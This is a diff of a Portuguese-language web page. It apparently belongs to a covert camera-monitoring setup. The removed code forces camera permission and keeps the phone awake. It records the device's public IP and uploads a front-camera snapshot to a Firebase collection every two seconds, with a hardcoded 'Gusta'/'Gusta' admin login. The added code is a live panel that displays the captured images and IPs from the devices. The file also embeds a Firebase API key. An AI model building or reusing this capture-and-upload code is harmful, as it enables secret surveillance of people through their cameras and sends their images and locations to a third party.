@@ -1,97 +1,112 @@
-<script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
-        projectId: "cameralog-24090",
-        appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
-    };
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Controle - Gusta</title>
+    <style>
+        body { font-family: sans-serif; background: #000; color: white; margin: 0; padding: 20px; }
+        h2 { color: #007bff; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
+        
+        #grid-monitores { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); 
+            gap: 20px; 
+            margin-top: 20px;
+        }
 
-    // Inicializa o Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    let meuIP = "carregando...";
+        .monitor-card { 
+            background: #111; 
+            border: 2px solid #333; 
+            border-radius: 10px; 
+            padding: 10px; 
+            transition: 0.3s;
+        }
 
-    const video = document.getElementById('webcam');
-    const canvas = document.getElementById('canvas-foto');
+        .monitor-card img { 
+            width: 100%; 
+            border-radius: 5px; 
+            background: #000;
+            display: block;
+        }
 
-    // 1. FUNÇÃO PARA FORÇAR PERMISSÃO (Crucial para APK)
-    async function pedirPermissaoECamera() {
-        try {
-            // Tenta acessar a câmera
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
+        .info {
+            margin-top: 10px;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-online { color: #00ff00; font-weight: bold; }
+        .status-offline { color: #ff4444; font-weight: bold; }
+
+        .badge {
+            background: #007bff;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Câmeras Ativas em Tempo Real</h2>
+    <div id="grid-monitores">Aguardando conexão dos dispositivos...</div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
+            projectId: "cameralog-24090",
+            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        function iniciarMonitoramento() {
+            const grid = document.getElementById('grid-monitores');
+
+            // Escuta a coleção "ips_ativos" em tempo real
+            db.collection("ips_ativos").onSnapshot((snapshot) => {
+                if (snapshot.empty) {
+                    grid.innerHTML = "Nenhum dispositivo conectado no momento.";
+                    return;
+                }
+
+                grid.innerHTML = "";
+                const agora = Date.now();
+
+                snapshot.forEach((doc) => {
+                    const dados = doc.data();
+                    const segundosDesdeUltimoPing = (agora - dados.last_ping) / 1000;
+                    const isOnline = segundosDesdeUltimoPing < 12; // 12 segundos de tolerância
+
+                    const card = document.createElement('div');
+                    card.className = "monitor-card";
+                    card.style.borderColor = isOnline ? "#007bff" : "#444";
+
+                    card.innerHTML = `
+                        <img src="${dados.imagem}">
+                        <div class="info">
+                            <div>
+                                <span class="badge">IP: ${dados.ip_original}</span>
+                                <div style="margin-top:5px; font-size:10px; color:#aaa;">Visto: ${new Date(dados.last_ping).toLocaleTimeString()}</div>
+                            </div>
+                            <span class="${isOnline ? 'status-online' : 'status-offline'}">
+                                ${isOnline ? '● AO VIVO' : '● DESCONECTADO'}
+                            </span>
+                        </div>
+                    `;
+                    grid.appendChild(card);
+                });
             });
-            video.srcObject = stream;
-            
-            // Tenta manter o celular acordado
-            if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen').catch(()=>{}); }
-            
-            // Se chegou aqui, a câmera está ativa. Inicia o loop de envio.
-            console.log("Câmera ativa com sucesso.");
-            setInterval(capturarEAtualizar, 2000);
-            
-        } catch (err) {
-            console.error("Erro ao acessar câmera: ", err);
-            alert("ERRO: O App precisa de permissão de CÂMERA para funcionar. Vá em Configurações > Apps > Permissões.");
         }
-    }
 
-    // 2. PEGAR IP E INICIAR
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-            meuIP = data.ip.replace(/\./g, '_');
-            pedirPermissaoECamera(); // Chama a função de permissão
-        })
-        .catch(() => {
-            meuIP = "IP_Desconhecido_" + Math.floor(Math.random() * 1000);
-            pedirPermissaoECamera();
-        });
-
-    function capturarEAtualizar() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            const context = canvas.getContext('2d');
-            canvas.width = 320; 
-            canvas.height = 240;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
-            
-            db.collection("ips_ativos").doc(meuIP).set({
-                ip_original: meuIP.replace(/_/g, '.'),
-                last_ping: Date.now(),
-                imagem: fotoBase64
-            }).catch(e => console.error("Erro Firebase:", e));
-        }
-    }
-
-    // FUNÇÕES DO PAINEL ADMIN (GUSTA)
-    function verificarAdmin() {
-        if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
-            document.getElementById('form-login').classList.add('hidden');
-            document.getElementById('painel-admin').classList.remove('hidden');
-            escutarMonitoramento();
-        } else {
-            alert("Acesso negado.");
-        }
-    }
-
-    function escutarMonitoramento() {
-        const grid = document.getElementById('grid-monitores');
-        db.collection("ips_ativos").onSnapshot((snapshot) => {
-            grid.innerHTML = "";
-            const agora = Date.now();
-            snapshot.forEach((doc) => {
-                const dados = doc.data();
-                const isOnline = (agora - dados.last_ping) / 1000 < 10;
-                const card = document.createElement('div');
-                card.className = `monitor-card ${isOnline ? 'online' : 'offline'}`;
-                card.innerHTML = `
-                    <span style="font-size:10px;"><span class="status-dot"></span>IP: ${dados.ip_original}</span>
-                    <img src="${dados.imagem}">
-                `;
-                grid.appendChild(card);
-            });
-        });
-    }
-</script>
+        window.onload = iniciarMonitoramento;
+    </script>
+</body>
+</html>
